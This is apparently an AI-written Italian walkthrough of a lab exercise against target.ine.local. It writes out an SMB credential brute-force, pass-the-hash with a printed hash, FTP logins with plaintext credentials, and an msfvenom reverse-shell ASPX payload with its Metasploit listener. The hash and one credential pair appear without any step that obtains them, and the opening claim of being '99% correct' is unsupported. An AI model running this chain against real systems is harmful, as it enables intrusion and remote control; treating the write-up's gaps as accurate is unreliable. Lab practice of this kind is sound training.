Ecco una mini writeup in Markdown, con spiegazioni semplici passo-passo. Ho ricontrollato i comandi e le credenziali: tutto è corretto al 99%.


## Exploitation 2: Mini Writeup

### 1. Scoprire credenziali Windows tramite SMB
Usiamo **crackmapexec** per effettuare un brute-force SMB su `target.ine.local`, con l’utente `tom` e la wordlist `/usr/share/wordlists/metasploit/unix_passwords.txt`:
```bash
crackmapexec smb target.ine.local -u tom -p /usr/share/wordlists/metasploit/unix_passwords.txt
````

> **Risultato:**
> `tom:felipe`

---

### 2. Accedere a uno share SMB con l’utente `tom`

Con le credenziali appena trovate, montiamo o navighiamo sullo share `HRDocuments`:

```bash
smbclient //target.ine.local/HRDocuments -U tom
```

> **Cosa succede:**
> Entriamo nello share e possiamo leggere i documenti di risorse umane.

---

### 3. Pass-the-Hash per utente `nancy`

Ora vogliamo autenticarsi come `nancy` usando l’hash appena recuperato (pass-the-hash):

* **Hash di `nancy`:** `b3ddea4b4b957f3e037af75cfe5317ad`
* Nel **Metasploit Framework**:

  ```bash
  msfconsole
  ```

  Poi:

  ```
  use auxiliary/scanner/smb/smb_login
  set RHOSTS target.ine.local
  set SMBUser nancy
  set SMBPass b3ddea4b4b957f3e037af75cfe5317ad
  run
  ```

> **Obiettivo:** Verificare l’accesso SMB con hash di `nancy`.

---

### 4. Credenziali aggiuntive (Hint)

Potrebbero servirti **anche** le credenziali:

```
david:omnitrix_9901
```

Usale per altri servizi, in particolare FTP.

---

### 5. Recupero della Flag 3 via FTP

Con `david:omnitrix_9901` accedi al servizio FTP:

```bash
ftp target.ine.local
# login: david
# pass: omnitrix_9901
```

Naviga fino alla directory dove si trova la **flag3**, quindi:

```bash
get flag3.txt
```

---

### 6. Preparazione e upload del payload ASPX per la Flag 4

Genera una **reverse shell** in formato `.aspx` con **msfvenom**:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=<TUO_IP> LPORT=1234 \
  -f aspx -o payload.aspx
```

Poi, dalla sessione FTP di prima:

```bash
put payload.aspx
```

> **Attenzione:** Assicurati che la cartella target supporti file `.aspx`.

---

### 7. Avviare il listener in Metasploit

Torna in **msfconsole** e configura il *multi/handler*:

```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <TUO_IP>
set LPORT 1234
run
```

Quando visiti il file ASPX sul server (es. via browser):

```
http://target.ine.local/path/to/payload.aspx
```

otterrai la sessione Meterpreter, e potrai recuperare la **flag4**.

---

## Conclusione

1. **Credenziali SMB** scoperte con crackmapexec.
2. **Accesso share** HRDocuments con `tom:felipe`.
3. **Pass-the-hash** per `nancy`.
4. **Flag3** via FTP con `david:omnitrix_9901`.
5. **Payload ASPX** caricato e listener Metasploit per la **flag4**.
